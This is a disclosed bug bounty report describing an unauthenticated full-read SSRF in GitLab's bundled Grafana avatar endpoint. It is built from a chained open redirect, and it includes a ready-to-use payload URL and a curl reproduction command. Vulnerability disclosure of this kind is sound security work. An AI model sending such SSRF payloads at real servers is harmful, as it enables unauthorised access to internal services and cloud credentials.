# Full Read SSRF on Gitlab's Internal Grafana

## Report Details
- **Report ID**: 878779
- **URL**: https://hackerone.com/reports/878779
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-20T13:47:25.959Z
- **Disclosed**: 2020-08-07T13:48:20.744Z

## Reporter
- **Username**: rhynorater
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerable to the SSRF outlined below.

## Summary
By chaining together some redirects and a URL decoding bug, it is possible to achieve a full-read, unauthenticated, SSRF from your Grafana instance. It is possible to recreate this bug on `dev.gitlab.org/-/grafana`. 

## Details
In the grafana source code, the following route is defined:
```
	r.Get("/avatar/:hash", avatarCacheServer.Handler)
```
This route takes the hash from under `/avatar/:hash` and routes it to `secure.grafana.com` in order to access a user's gravatar image. The code that does this looks like this:
```
const (
	gravatarSource = "https://secure.gravatar.com/avatar/"
)
...
case err = <-thunder.GoFetch(gravatarSource+this.hash+"?"+this.reqParams, this):
```
The `this.hash` referenced in this code is the hash passed in via `/avatar/:hash` **URL Decoded**. The fact that this `:hash` is URL Decoded allows us to smuggle in our own parameters into this request. On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted. This is the first redirect in the redirect chain.

In order to get from `i0.wp.com` to any arbitrary host, quite a lot of investigation into this domain had to be performed. In the end, the open redirect achieved due to some improper redirect validation. The format of urls on `i0.wp.com` are as follows `i0.wp.com/{domainOfImage}/{pathOfImage}`. It seems that `i0.wp.com` wanted to offload some of its image hosting to `.bp.blogspot.com` whenever possible, so for any host whose domain was `*.bp.blogspot.com`, `i0.wp.com` would redirect to that host in order to avoid serving the image. However, after many long hours of investigation, it was discovered that it is possible to turn this into an open redirect using the following form:
```
http://i0.wp.com/google.com/1.bp.blogspot.com/
```
By using this trick it is possible to create a redirection chain that goes like this:
```
https://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/
->
http://i0.wp.com/google.com/1.bp.blogspot.com/
->
https://google.com/1.bp.blogspot.com
```

Finally, using this it is possible to create the SSRF using the following payload:
```
https://dev.gitlab.org/-/grafana/avatar/tesata%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fYOURHOSTHERE%26cachebust
```
(`redirect.rhynorater.com` is configured to redirect to any host provided after the `1.bp.blogspot.com` directory)

## Steps to Reproduce
Run the following `curl` command:
```
curl "https://dev.gitlab.org/-/grafana/avatar/test%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fpoc.rhynorater.com%26cachebust"
```

## Remediation
In order to remediate this bug one must either take the Grafana instance inside the internal network or WAF off the `/avatar/` endpoint.

## Impact

Full read, unauthenticated SSRF. This can result in RCE in many environments due to cloud misconfigurations

## Attachments
No attachments
